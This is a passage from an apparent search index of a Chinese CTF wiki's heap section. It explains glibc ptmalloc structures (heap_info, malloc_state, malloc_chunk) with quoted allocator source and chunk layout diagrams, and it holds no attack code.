HEAP_MAX_SIZE # ifdef DEFAULT_MMAP_THRESHOLD_MAX # define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX) # else # define HEAP_MAX_SIZE (1024 * 1024) /* must be a power of two */ # endif #endif /* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps that are dynamically created for multi-threaded programs. The maximum size must be a power of two, for fast determination of which heap belongs to a chunk. It should be much larger than the mmap threshold, so that requests with a size just below that threshold can be fulfilled without creating too many heaps. */ /***************************************************************************/ /* A heap is a single contiguous memory region holding (coalesceable) malloc_chunks. It is allocated with mmap() and always starts at an address aligned to HEAP_MAX_SIZE. */ typedef struct _heap_info { mstate ar_ptr ; /* Arena for this heap. */ struct _heap_info * prev ; /* Previous heap. */ size_t size ; /* Current size in bytes. */ size_t mprotect_size ; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad [ - 6 * SIZE_SZ & MALLOC_ALIGN_MASK ]; } heap_info ; \u8be5\u7ed3\u6784\u4e3b\u8981\u662f\u63cf\u8ff0\u5806\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5305\u62ec \u5806\u5bf9\u5e94\u7684 arena \u7684\u5730\u5740 \u7531\u4e8e\u4e00\u4e2a\u7ebf\u7a0b\u7533\u8bf7\u4e00\u4e2a\u5806\u4e4b\u540e\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u5b8c\uff0c\u4e4b\u540e\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u5806\u3002prev\u5373\u8bb0\u5f55\u4e86\u4e0a\u4e00\u4e2a heap_info \u7684\u5730\u5740\u3002\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u5806\u7684 heap_info \u662f\u901a\u8fc7\u5355\u5411\u94fe\u8868\u8fdb\u884c\u94fe\u63a5\u7684\u3002 size \u8868\u793a\u5f53\u524d\u5806\u7684\u5927\u5c0f \u6700\u540e\u4e00\u90e8\u5206\u786e\u4fdd\u5bf9\u9f50\uff08 \u8fd9\u91cc\u8d1f\u6570\u4f7f\u7528\u7684\u7f18\u7531\u662f\u4ec0\u4e48\u5462 \uff1f\uff09 \u770b\u8d77\u6765\u8be5\u7ed3\u6784\u5e94\u8be5\u662f\u76f8\u5f53\u91cd\u8981\u7684\uff0c\u4f46\u662f\u5982\u679c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u770b\u5b8c\u6574\u4e2a malloc \u7684\u5b9e\u73b0\u7684\u8bdd\uff0c\u5c31\u4f1a\u53d1\u73b0\u5b83\u51fa\u73b0\u7684\u9891\u7387\u5e76\u4e0d\u9ad8\u3002 malloc_state \u00b6 \u8be5\u7ed3\u6784\u7528\u4e8e\u7ba1\u7406\u5806\uff0c\u8bb0\u5f55\u6bcf\u4e2a arena \u5f53\u524d\u7533\u8bf7\u7684\u5185\u5b58\u7684\u5177\u4f53\u72b6\u6001\uff0c\u6bd4\u5982\u8bf4\u662f\u5426\u6709\u7a7a\u95f2chunk\uff0c\u6709\u4ec0\u4e48\u5927\u5c0f\u7684\u7a7a\u95f2chunk \u7b49\u7b49\u3002\u65e0\u8bba\u662f thread arena \u8fd8\u662f main arena\uff0c\u5b83\u4eec\u90fd\u53ea\u6709\u4e00\u4e2a malloc state \u7ed3\u6784\u3002\u7531\u4e8e thread \u7684 arena \u53ef\u80fd\u6709\u591a\u4e2a\uff0cmalloc state\u7ed3\u6784\u4f1a\u5728\u6700\u65b0\u7533\u8bf7\u7684arena\u4e2d\u3002 \u6ce8\u610f\uff0cmain arena \u7684 malloc_state \u5e76\u4e0d\u662f heap segment \u7684\u4e00\u90e8\u5206\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002 \u5176\u7ed3\u6784\u5982\u4e0b struct malloc_state { /* Serialize access. */ __libc_lock_define (, mutex ); /* Flags (formerly in max_fast). */ int flags ; /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top ; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder ; /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; /* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/ unsigned int binmap [ BINMAPSIZE ]; /* Linked list, points to the next arena */ struct malloc_state * next ; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state * next_free ; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads ; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem ; INTERNAL_SIZE_T max_system_mem ; }; __libc_lock_define(, mutex); \u8be5\u53d8\u91cf\u7528\u4e8e\u63a7\u5236\u7a0b\u5e8f\u4e32\u884c\u8bbf\u95ee\u540c\u4e00\u4e2a\u5206\u914d\u533a\uff0c\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u83b7\u53d6\u4e86\u5206\u914d\u533a\u4e4b\u540e\uff0c\u5176\u5b83\u7ebf\u7a0b\u8981\u60f3\u8bbf\u95ee\u8be5\u5206\u914d\u533a\uff0c\u5c31\u5fc5\u987b\u7b49\u5f85\u8be5\u7ebf\u7a0b\u5206\u914d\u5b8c\u6210\u5019\u624d\u80fd\u591f\u4f7f\u7528\u3002 flags flags\u8bb0\u5f55\u4e86\u5206\u914d\u533a\u7684\u4e00\u4e9b\u6807\u5fd7\uff0c\u6bd4\u5982 bit0 \u8bb0\u5f55\u4e86\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk \uff0cbit1 \u6807\u8bc6\u5206\u914d\u533a\u662f\u5426\u80fd\u8fd4\u56de\u8fde\u7eed\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\u5177\u4f53\u5982\u4e0b /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) fastbinsY[NFASTBINS] \u5b58\u653e\u6bcf\u4e2a fast chunk \u94fe\u8868\u5934\u90e8\u7684\u6307\u9488 top \u6307\u5411\u5206\u914d\u533a\u7684 top chunk last_reminder \u6700\u65b0\u7684 chunk \u5206\u5272\u4e4b\u540e\u5269\u4e0b\u7684\u90a3\u90e8\u5206 bins \u7528\u4e8e\u5b58\u50a8 unstored bin\uff0csmall bins \u548c large bins \u7684 chunk \u94fe\u8868\u3002 binmap ptmalloc \u7528\u4e00\u4e2a bit \u6765\u6807\u8bc6\u67d0\u4e00\u4e2a bin \u4e2d\u662f\u5426\u5305\u542b\u7a7a\u95f2 chunk \u3002 malloc_par \u00b6 \uff01\uff01\u5f85\u8865\u5145\uff01\uff01","title":"\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784"},{"location":"pwn/heap/heap_structure/#_1","text":"\u5806\u7684\u64cd\u4f5c\u5c31\u8fd9\u4e48\u590d\u6742\uff0c\u90a3\u4e48\u5728 glibc \u5185\u90e8\u5fc5\u7136\u4e5f\u6709\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u5b83\u3002\u4e0e\u5806\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a \u5b8f\u89c2\u7ed3\u6784\uff0c\u5305\u542b\u5806\u7684\u5b8f\u89c2\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u7d22\u5f15\u5806\u7684\u57fa\u672c\u4fe1\u606f\u3002 \u5fae\u89c2\u7ed3\u6784\uff0c\u7528\u4e8e\u5177\u4f53\u5904\u7406\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u4e2d\u7684\u5185\u5b58\u5757\u3002","title":"\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784"},{"location":"pwn/heap/heap_structure/#overview","text":"\u8fd9\u91cc\u7ed9\u4e00\u4e2a\u5b8f\u89c2\u7684\u56fe\u7247\u3002","title":"Overview\uff1f\uff1f\uff1f\uff1f"},{"location":"pwn/heap/heap_structure/#_2","text":"\u8fd9\u91cc\u9996\u5148\u4ecb\u7ecd\u5806\u4e2d\u6bd4\u8f83\u7ec6\u8282\u7684\u7ed3\u6784\uff0c \u5806\u7684\u6f0f\u6d1e\u5229\u7528\u4e0e\u8fd9\u4e9b\u7ed3\u6784\u5bc6\u5207\u76f8\u5173 \u3002","title":"\u5fae\u89c2\u7ed3\u6784"},{"location":"pwn/heap/heap_structure/#malloc_chunk","text":"","title":"malloc_chunk"},{"location":"pwn/heap/heap_structure/#_3","text":"\u5728\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u79f0\u7531 malloc \u7533\u8bf7\u7684\u5185\u5b58\u4e3a chunk \u3002\u8fd9\u5757\u5185\u5b58\u5728 ptmalloc \u5185\u90e8\u7528 malloc_chunk \u7ed3\u6784\u4f53\u6765\u8868\u793a\u3002\u5f53\u7a0b\u5e8f\u7533\u8bf7\u7684 chunk \u88ab free \u540e\uff0c\u4f1a\u88ab\u52a0\u5165\u5230\u76f8\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u5217\u8868\u4e2d\u3002 \u975e\u5e38\u6709\u610f\u601d\u7684\u662f\uff0c \u65e0\u8bba\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u5982\u4f55\uff0c\u5904\u4e8e\u5206\u914d\u72b6\u6001\u8fd8\u662f\u91ca\u653e\u72b6\u6001\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e00\u4e2a\u7edf\u4e00\u7684\u7ed3\u6784 \u3002\u867d\u7136\u5b83\u4eec\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u6839\u636e\u662f\u5426\u88ab\u91ca\u653e\uff0c\u5b83\u4eec\u7684\u8868\u73b0\u5f62\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\u3002 malloc_chunk \u7684\u7ed3\u6784\u5982\u4e0b /* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size ; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size ; /* Size in bytes, including overhead. */ struct malloc_chunk * fd ; /* double links -- used only if free. */ struct malloc_chunk * bk ; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk * fd_nextsize ; /* double links -- used only if free. */ struct malloc_chunk * bk_nextsize ; }; \u9996\u5148\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e9b\u5fc5\u8981\u7684\u89e3\u91ca INTERNAL_SIZE_T\uff0cSIZE_SZ\uff0cMALLOC_ALIGN_MASK\uff1a /* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of chunk sizes. The default version is the same as size_t. While not strictly necessary, it is best to define this as an unsigned type, even if size_t is a signed type. This may avoid some artificial size limitations on some systems. On a 64-bit machine, you may be able to reduce malloc overhead by defining INTERNAL_SIZE_T to be a 32 bit `unsigned int' at the expense of not being able to handle more than 2^32 of malloced space. If this limitation is acceptable, you are encouraged to set this unless you are on a platform requiring 16byte alignments. In this case the alignment requirements turn out to negate any potential advantages of decreasing size_t word size. Implementors: Beware of the possible combinations of: - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits, and might be the same width as int or as long - size_t might have different width and signedness as INTERNAL_SIZE_T - int and long might be 32 or 64 bits, and might be the same width To deal with this, most comparisons and difference computations among INTERNAL_SIZE_Ts should cast them to unsigned long, being aware of the fact that casting an unsigned int to a wider long does not sign-extend. (This also makes checking for negative numbers awkward.) Some of these casts result in harmless compiler warnings on some systems. */ #ifndef INTERNAL_SIZE_T # define INTERNAL_SIZE_T size_t #endif /* The corresponding word size. */ #define SIZE_SZ (sizeof (INTERNAL_SIZE_T)) /* The corresponding bit mask value. */ #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) \u4e00\u822c\u6765\u8bf4\uff0csize_t \u5728 64 \u4f4d\u4e2d\u662f 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c32 \u4f4d\u4e2d\u662f 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002 \u6bcf\u4e2a\u5b57\u6bb5\u7684\u5177\u4f53\u7684\u89e3\u91ca\u5982\u4e0b prev_size , \u5982\u679c\u8be5 chunk \u7684 \u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u5730\u5740chunk\uff08\u4e24\u4e2a\u6307\u9488\u7684\u5730\u5740\u5dee\u503c\u4e3a\u524d\u4e00chunk\u5927\u5c0f\uff09 \u662f\u7a7a\u95f2\u7684\u8bdd\uff0c\u90a3\u8be5\u5b57\u6bb5\u8bb0\u5f55\u7684\u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f(\u5305\u62ec chunk \u5934)\u3002\u5426\u5219\uff0c\u8be5\u5b57\u6bb5\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u4e2achunk \u7684\u6570\u636e\u3002 \u8fd9\u91cc\u7684\u524d\u4e00 chunk \u6307\u7684\u662f\u8f83\u4f4e\u5730\u5740\u7684 chunk \u3002 size \uff0c\u8be5 chunk \u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\u3002\u5982\u679c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\uff0c\u4f1a\u88ab\u8f6c\u6362\u6ee1\u8db3\u5927\u5c0f\u7684\u6700\u5c0f\u7684 2 * SIZE_SZ \u7684\u500d\u6570\u300232 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 4\uff1b64 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 8\u3002 \u8be5\u5b57\u6bb5\u7684\u4f4e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u5bf9 chunk \u7684\u5927\u5c0f\u6ca1\u6709\u5f71\u54cd\uff0c\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u8868\u793a NON_MAIN_ARENA\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1\u8868\u793a\u4e0d\u5c5e\u4e8e\uff0c0\u8868\u793a\u5c5e\u4e8e\u3002 IS_MAPPED\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\u3002 PREV_INUSE\uff0c\u8bb0\u5f55\u524d\u4e00\u4e2a chunk \u5757\u662f\u5426\u88ab\u5206\u914d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5806\u4e2d\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5185\u5b58\u5757\u7684 size \u5b57\u6bb5\u7684P\u4f4d\u90fd\u4f1a\u88ab\u8bbe\u7f6e\u4e3a1\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u8bbf\u95ee\u524d\u9762\u7684\u975e\u6cd5\u5185\u5b58\u3002\u5f53\u4e00\u4e2a chunk \u7684 size \u7684 P \u4f4d\u4e3a 0 \u65f6\uff0c\u6211\u4eec\u80fd\u901a\u8fc7 prev_size \u5b57\u6bb5\u6765\u83b7\u53d6\u4e0a\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u5730\u5740\u3002\u8fd9\u4e5f\u65b9\u4fbf\u8fdb\u884c\u7a7a\u95f2chunk\u4e4b\u95f4\u7684\u5408\u5e76\u3002 fd\uff0cbk \u3002 chunk \u5904\u4e8e\u5206\u914d\u72b6\u6001\u65f6\uff0c\u4ece fd \u5b57\u6bb5\u5f00\u59cb\u662f\u7528\u6237\u7684\u6570\u636e\u3002chunk \u7a7a\u95f2\u65f6\uff0c\u4f1a\u88ab\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u94fe\u8868\u4e2d\uff0c\u5176\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b fd \u6307\u5411\u4e0b\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk bk \u6307\u5411\u4e0a\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk \u901a\u8fc7 fd \u548c bk \u53ef\u4ee5\u5c06\u7a7a\u95f2\u7684 chunk \u5757\u52a0\u5165\u5230\u7a7a\u95f2\u7684 chunk \u5757\u94fe\u8868\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406 fd_nextsize\uff0c bk_nextsize \uff0c\u4e5f\u662f\u53ea\u6709 chunk \u7a7a\u95f2\u7684\u65f6\u5019\u624d\u4f7f\u7528\uff0c\u4e0d\u8fc7\u5176\u7528\u4e8e\u8f83\u5927\u7684 chunk\uff08large chunk\uff09\u3002 fd_nextsize \u6307\u5411\u524d\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 bk_nextsize \u6307\u5411\u540e\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 \u4e00\u822c\u7a7a\u95f2\u7684 large chunk \u5728 fd \u7684\u904d\u5386\u987a\u5e8f\u4e2d\uff0c\u6309\u7167\u7531\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5217\u3002 \u8fd9\u6837\u505a\u53ef\u4ee5\u907f\u514d\u5728\u5bfb\u627e\u5408\u9002chunk \u65f6\u6328\u4e2a\u904d\u5386\u3002 \u4e00\u4e2a\u5df2\u7ecf\u5206\u914d\u7684 chunk \u7684\u6837\u5b50\u5982\u4e0b\u3002 \u6211\u4eec\u79f0\u524d\u4e24\u4e2a\u5b57\u6bb5\u79f0\u4e3a chunk header\uff0c\u540e\u9762\u7684\u90e8\u5206\u79f0\u4e3auser data\u3002\u6bcf\u6b21 malloc \u7533\u8bf7\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488\uff0c\u5176\u5b9e\u6307\u5411user data\u7684\u8d77\u59cb\u5904\u3002 \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u57df\u65e0\u6548\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a chunk \u7684\u8be5\u90e8\u5206\u4e5f\u53ef\u4ee5\u88ab\u5f53\u524dchunk\u4f7f\u7528\u3002 \u8fd9\u5c31\u662fchunk\u4e2d\u7684\u7a7a\u95f4\u590d\u7528\u3002 chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk , if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk , in bytes | A | M | P | mem -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here ... . . . . ( malloc_usable_size () bytes ) . next . | chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | ( size of chunk , but used for application data ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk , in bytes | A | 0 | 1 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u88ab\u91ca\u653e\u7684 chunk \u88ab\u8bb0\u5f55\u5728\u94fe\u8868\u4e2d\uff08\u53ef\u80fd\u662f\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u4e5f\u53ef\u80fd\u662f\u5355\u5411\u94fe\u8868\uff09\u3002\u5177\u4f53\u7ed3\u6784\u5982\u4e0b chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk , if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ` head : ' | Size of chunk , in bytes | A | 0 | P | mem -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space ( may be 0 bytes long ) . . . next . | chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ` foot : ' | Size of chunk , in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk , in bytes | A | 0 | 0 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u4e00\u4e2a chunk \u5904\u4e8e free \u72b6\u6001\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u4e2a\u4f4d\u7f6e\u8bb0\u5f55\u5176\u76f8\u5e94\u7684\u5927\u5c0f \u672c\u8eab\u7684size\u5b57\u6bb5\u4f1a\u8bb0\u5f55\uff0c \u5b83\u540e\u9762\u7684 chunk \u4f1a\u8bb0\u5f55\u3002 \u4e00\u822c\u60c5\u51b5\u4e0b \uff0c\u7269\u7406\u76f8\u90bb\u7684\u4e24\u4e2a\u7a7a\u95f2 chunk \u4f1a\u88ab\u5408\u5e76\u4e3a\u4e00\u4e2a chunk \u3002\u5806\u7ba1\u7406\u5668\u4f1a\u901a\u8fc7 prev_size \u5b57\u6bb5\u4ee5\u53ca size \u5b57\u6bb5\u5408\u5e76\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5757\u3002 \uff01\uff01\uff01\u4e00\u4e9b\u5173\u4e8e\u5806\u7684\u7ea6\u675f\uff0c\u540e\u9762\u8be6\u7ec6\u8003\u8651\uff01\uff01\uff01 /* The three exceptions to all this are: 1. The special chunk `top' doesn't bother using the trailing size field since there is no next contiguous chunk that would have to index off it. After initialization, `top' is forced to always exist. If it would become less than MINSIZE bytes long, it is replenished. 2. Chunks allocated via mmap, which have the second-lowest-order bit M (IS_MMAPPED) set in their size fields. Because they are allocated one-by-one, each must contain its own trailing size field. If the M bit is set, the other bits are ignored (because mmapped chunks are neither in an arena, nor adjacent to a freed chunk). The M bit is also used for chunks which originally came from a dumped heap via malloc_set_state in hooks.c. 3. Chunks in fastbins are treated as allocated chunks from the point of view of the chunk allocator. They are consolidated with their neighbors only in bulk, in malloc_consolidate. */","title":"\u6982\u8ff0"},{"location":"pwn/heap/heap_structure/#chunk","text":"\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk \u7684\u5927\u5c0f\u3001\u5bf9\u9f50\u68c0\u67e5\u4ee5\u53ca\u4e00\u4e9b\u8f6c\u6362\u7684\u5b8f\u3002 chunk \u4e0e mem \u6307\u9488\u5934\u90e8\u7684\u8f6c\u6362 mem\u6307\u5411\u7528\u6237\u5f97\u5230\u7684\u5185\u5b58\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002 /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ)) \u6700\u5c0f\u7684 chunk \u5927\u5c0f /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) \u8fd9\u91cc\uff0coffsetof \u51fd\u6570\u8ba1\u7b97\u51fa fd_nextsize \u5728 malloc_chunk \u4e2d\u7684\u504f\u79fb\uff0c\u8bf4\u660e\u6700\u5c0f\u7684 chunk \u81f3\u5c11\u8981\u5305\u542b bk \u6307\u9488\u3002 \u6700\u5c0f\u7533\u8bf7\u7684\u5806\u5185\u5b58\u5927\u5c0f \u7528\u6237\u6700\u5c0f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6700\u5c0f\u6574\u6570\u500d\u3002 \u6ce8\uff1a\u5c31\u76ee\u524d\u800c\u770b MIN_CHUNK_SIZE \u548c MINSIZE \u5927\u5c0f\u662f\u4e00\u81f4\u7684\uff0c\u4e2a\u4eba\u8ba4\u4e3a\u4e4b\u6240\u4ee5\u8981\u6dfb\u52a0\u4e24\u4e2a\u5b8f\u662f\u4e3a\u4e86\u65b9\u4fbf\u4ee5\u540e\u4fee\u6539 malloc_chunk \u65f6\u65b9\u4fbf\u4e00\u4e9b\u3002 /* The smallest size we can malloc is an aligned minimal chunk */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define MINSIZE \\ (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) & \\ ~MALLOC_ALIGN_MASK)) \u68c0\u67e5\u5206\u914d\u7ed9\u7528\u6237\u7684\u5185\u5b58\u662f\u5426\u5bf9\u9f50 2 * SIZE_SZ \u5927\u5c0f\u5bf9\u9f50\u3002 /* Check if m has acceptable alignment */ // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK) \u8bf7\u6c42\u5b57\u8282\u6570\u5224\u65ad /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) \u5c06\u7528\u6237\u8bf7\u6c42\u5185\u5b58\u5927\u5c0f\u8f6c\u4e3a\u5b9e\u9645\u5206\u914d\u5185\u5b58\u5927\u5c0f /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) { \\ __set_errno(ENOMEM); \\ return 0; \\ } \\ (sz) = request2size(req); \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u5df2\u5206\u914d\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size 